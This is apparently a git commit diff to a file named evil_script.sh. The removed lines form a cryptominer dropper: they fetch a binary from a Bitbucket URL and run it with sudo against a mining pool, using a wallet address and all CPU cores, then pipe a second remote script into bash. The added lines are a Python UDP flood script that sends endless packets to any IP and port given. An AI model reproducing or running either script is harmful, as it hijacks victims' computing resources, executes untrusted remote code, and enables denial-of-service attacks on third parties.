fe181463e5b157e9cb8e12e420608ad6a655631a
suhujetlag5 <143488653+suhujetlag5@users.noreply.github.com>
2023-09-11 14:08:09 +0700

    Update evil_script.sh

--- evil_script.sh
+++ evil_script.sh
@@ -1,5 +1,16 @@
-#!/bin/bash
-wget -O sgr1 https://bitbucket.org/commuter21/escom/downloads/xmolx >/dev/null 2>&1
-chmod +x sgr1
-sudo ./sgr1 -a rx/0 -o 172.104.176.128:80 -u ZEPHs9wbP2kgeHU9wJoPonUwJAsZkj5rHagMgnDjK7186LuNVVfFeCGDByX2Y18AvbdRJQsNK4Fu4QM7XGs1bXegNGhthDhZ5ht -p Tester2 -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
-curl -sL https://bitbucket.org/nicezep/file/raw/master/time | bash
+#!/usr/bin/python
+import socket
+import sys
+
+def send_traffic(ip, port):
+     print "Sending burst to " + ip + ":" + str(port)
+     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+     sock.connect((ip, port))
+     while True:
+         sock.send("I AM A BAD BOY") 
+
+if len(sys.argv) != 3:
+     print "Usage: " + sys.argv[0] + " IP PORT"
+     sys.exit() 
+
+send_traffic(sys.argv[1], int(sys.argv[2]))
